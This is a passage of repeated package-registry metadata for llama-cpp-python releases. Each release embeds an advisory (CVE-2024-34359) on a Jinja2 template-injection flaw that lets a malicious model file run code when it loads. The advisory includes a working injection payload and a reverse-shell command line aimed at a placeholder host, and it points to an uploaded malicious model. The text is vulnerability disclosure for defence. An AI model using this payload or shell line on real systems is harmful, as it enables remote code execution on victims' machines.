   raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.31":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.31/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.31","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a1c87831d0908b23670112663913b1789a7adb47dc70e28318ee889afc7fc3be","md5":"68029b9f42851d55453c75766e84fa25","sha256":"4f8848a061bc7f23254e482dc9b6e48f4e7fe7f79fa4fcc461076158d76bc21d"},"downloads":-1,"filename":"llama_cpp_python-0.2.31.tar.gz","has_sig":false,"md5_digest":"68029b9f42851d55453c75766e84fa25","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9723917,"upload_time":"2024-01-19T14:05:50","upload_time_iso_8601":"2024-01-19T14:05:50.720865Z","url":"https://files.pythonhosted.org/packages/a1/c8/7831d0908b23670112663913b1789a7adb47dc70e28318ee889afc7fc3be/llama_cpp_python-0.2.31.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.32":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.32/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.32","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"806501fd26598cdd3cd09b6ce006cca2290bb762a4cc9f76e1a2c9c5a00b8cff","md5":"cea2ace65cd9e3e9806c05a9e07d8fdf","sha256":"202d0596f044542678d062a4ef6d8eddb70acf818895b7535b3311a51f262fb4"},"downloads":-1,"filename":"llama_cpp_python-0.2.32.tar.gz","has_sig":false,"md5_digest":"cea2ace65cd9e3e9806c05a9e07d8fdf","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10084791,"upload_time":"2024-01-22T13:25:47","upload_time_iso_8601":"2024-01-22T13:25:47.881891Z","url":"https://files.pythonhosted.org/packages/80/65/01fd26598cdd3cd09b6ce006cca2290bb762a4cc9f76e1a2c9c5a00b8cff/llama_cpp_python-0.2.32.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.33":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 